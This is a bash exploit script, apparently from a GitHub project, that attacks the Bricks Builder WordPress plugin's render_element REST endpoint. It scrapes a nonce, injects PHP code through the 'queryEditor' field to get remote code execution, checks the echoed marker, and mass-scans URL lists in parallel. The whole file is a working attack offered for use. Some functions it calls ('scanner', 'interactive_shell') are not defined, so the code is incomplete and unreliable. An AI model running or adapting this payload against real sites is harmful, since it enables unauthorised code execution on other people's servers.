#!/bin/bash

# Function to fetch nonce from target URL
fetch_nonce() {
    target=$1
    nonce=$(curl -s -k -L "$target" | grep -oP '(?<="nonce":")[^"]+')
    echo "$nonce"
}

# Function to exploit the vulnerability
exploit() {
    target=$1
    nonce=$(fetch_nonce "$target")
    if [ ! -z "$nonce" ]; then
        for path in "${paths[@]}"; do
            if exploit_successful "$target" "$path" "$nonce"; then
                interactive_shell "$target" "$nonce"
                break
            fi
        done
    fi
}

# Function to check if the exploit was successful
exploit_successful() {
    target=$1
    path=$2
    nonce=$3
    echo "[*] Checking if the target is vulnerable"
    response=$(curl -s -k -X POST -H "Content-Type: application/json" -d "$(create_element "$nonce")" "$target$path")
    if [[ "$response" =~ "Lutfifakee" ]]; then
        echo "[+] The target is vulnerable"
        echo "[*] Initiating exploit against: $target"
        echo "[*] Initiating interactive shell"
        return 0
    else
        echo "[~] The target does not appear to be vulnerable"
        return 1
    fi
}

# Function to create vulnerable data
create_element() {
    nonce=$1
    echo '{"postId":"1","nonce":"'"$nonce"'","element":{"name":"container","settings":{"hasLoop":"true","query":{"useQueryEditor":true,"queryEditor":"throw new Exception(`echo Lutfifakee`);","objectType":"post"}}}}'
}

# Function to scan a single URL
scan_url() {
    url=$1
    nonce=$(fetch_nonce "$url")
    if [ ! -z "$nonce" ]; then
        scanner "$url" "$nonce"
    fi
}

# Function to scan multiple URLs from a file
scan_file() {
    file=$1
    threads=$2
    while IFS= read -r url || [ -n "$url" ]; do
        scan_url "$url" &
    done < "$file"
    wait
}

# Main function
main() {
    ascii_art
    if [ "$#" -eq 0 ]; then
        echo -e " \033[34m[INF]\033[37m Usage: $0 [-u URL | -f FILE] [-t THREADS]"
        exit 1
    fi

    while getopts ":u:f:t:" opt; do
        case $opt in
            u)
                exploit "$OPTARG"
                ;;
            f)
                scan_file "$OPTARG" "$threads"
                ;;
            t)
                threads="$OPTARG"
                ;;
            \?)
                echo "Invalid option: -$OPTARG" >&2
                exit 1
                ;;
            :)
                echo "Option -$OPTARG requires an argument." >&2
                exit 1
                ;;
        esac
    done
}

# Global variables
paths=(
    "/wp-json/bricks/v1/render_element"
    "/?rest_route=/bricks/v1/render_element"
)
headers=(
    "Content-Type: application/json"
    "User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Mobile Safari/537.36"
)

# ASCII art function
ascii_art() {
    echo -e "\033[36m"
    cat << "EOF"
  ___  __    __ .____         ___    ___/  ___                ___   ____   __    ___/   ___/
.'   \ |     |  /            /   \ .'  /\ /   \ |   |        /   \ |     .'    .'  /\ .'  /\
|       \    /  |__.   .---'   _-' |  / |   _-' `.__|  .---'   _-' `---. |---. |  / | |  / |
|        \  /   |             /    |,'  |  /        |         /        | |   | |,'  | |,'  |
 `.__,    \/    /----/       /___, /`---' /___,     |        /___, \__.' `._.' /`---' /`---'
EOF
    echo -e "\033[33m                                                   github.com/X-Projetion \033[37m \n\n"
}

# Start script
main "$@"
